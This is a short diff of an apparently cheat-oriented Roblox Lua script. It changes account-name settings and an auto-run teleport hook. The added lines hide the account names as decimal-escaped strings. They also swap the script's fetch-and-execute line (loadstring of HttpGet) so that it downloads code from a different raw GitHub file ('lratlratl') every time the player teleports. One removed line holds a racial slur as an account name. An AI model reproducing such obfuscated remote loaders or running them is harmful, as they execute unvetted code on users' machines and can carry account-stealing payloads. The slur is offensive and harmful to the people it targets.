@@ -1,9 +1,9 @@
 task.spawn(function()
 --Set Accounts First
-local mainAcc = "nigga"
-local altAcc1 = "SlimeCrystalPanda"
-local altAcc2 = "JellySkaterCha0s"
-local altAcc3 = "NeonCraze2008"
+local mainAcc = "\65\72\121\100\114\111\65"
+local altAcc1 = "\83\108\105\109\101\67\114\121\115\116\97\108\80\97\110\100\97"
+local altAcc2 = "\74\101\108\108\121\83\107\97\116\101\114\67\104\97\48\115"
+local altAcc3 = "\78\101\111\110\67\114\97\122\101\50\48\48\56"
 
 ---------------------------------------
 repeat task.wait() until game:IsLoaded()
@@ -6498,7 +6498,7 @@ local TeleportCheck = false
 Players.LocalPlayer.OnTeleport:Connect(function(State)
 	if KeepInfYield and (not TeleportCheck) and queueteleport then
 		TeleportCheck = true
-		queueteleport("loadstring(game:HttpGet('https://pastefy.app/43uXBgoz/raw'))()")
+		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/raptorcxd/lratlratl/refs/heads/main/message%20(6).txt'))()")
 	end
 end)
 
